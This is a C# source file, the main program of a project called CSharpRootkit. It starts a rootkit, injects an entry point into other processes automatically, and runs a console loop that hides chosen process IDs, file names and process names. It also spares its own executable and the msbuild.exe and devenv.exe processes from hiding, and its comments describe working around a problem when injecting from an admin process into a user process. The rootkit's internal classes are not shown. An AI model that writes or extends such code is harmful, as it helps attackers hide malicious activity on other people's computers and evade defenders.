using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace CSharpRootkit
{
    public class Program
    {
        static void Main(string[] args)
        {
            Console.ReadLine();

            RootKitInterface.Start(true);
            RootKitInterface.AddInclusionExclusionFilePath(Assembly.GetEntryAssembly().Location);
            RootKitInterface.AddInclusionExclusionProcessName("msbuild.exe");
            RootKitInterface.AddInclusionExclusionProcessName("devenv.exe");
            //Console.ReadLine();
            AutoInjector.Start(InjectionEntryPoint);



            Console.WriteLine("injected all");
            Console.WriteLine("pid, filename, processname, stop");
            while (RootKitInterface.started)
            {
                Console.Write("Enter command: ");
                string commmand=Console.ReadLine();
                if (commmand == "pid")
                {
                    RootKitInterface.HidePid(int.Parse(Console.ReadLine()));
                }
                else if (commmand == "filename")
                {
                    RootKitInterface.HideFileName(Console.ReadLine());
                }
                else if (commmand == "processname")
                {
                    RootKitInterface.HideProcessName(Console.ReadLine());
                }
                else if (commmand == "stop")
                {
                    break;
                }
                else 
                {
                    Console.WriteLine("unknown command");
                }
            }
            Console.WriteLine("done.");

            AutoInjector.Stop();
            RootKitInterface.Stop();
            Console.ReadLine();
        }


        public static void InjectionEntryPoint()
        {
            //we do this as there a weird issue when injeting from admin into a user process, in the Utils constructor it starts the IDebugClient and IDebugControl, we need these to get the assembly code for the function hooking.
            //the problem is it takes upward of 5 seconds to start up when injecting from admin -> user, which makes no sense to me. I'm guessing starting the thread is inheriting some admin properties which messes stuff up internally for the IDebugControl.
            //my solution it to start a new thread and let the old one die, this appears to fix it, im guessing because it starts it with the proper thread attributes for the given process.
            //if anyone knows a real reason why and a solution, hit me up.
            new Thread(InjectionStartingPoint).Start();
        }

        public static void InjectionStartingPoint()
        {
            //NativeMethods.AllocConsole();
            //Console.WriteLine("om");
            if (!Utils.setInjectionFlag(out bool alreadyInjected) || alreadyInjected)
            {
                return;
            }
            RootKitClientInterface.Start();
        }

    }
}
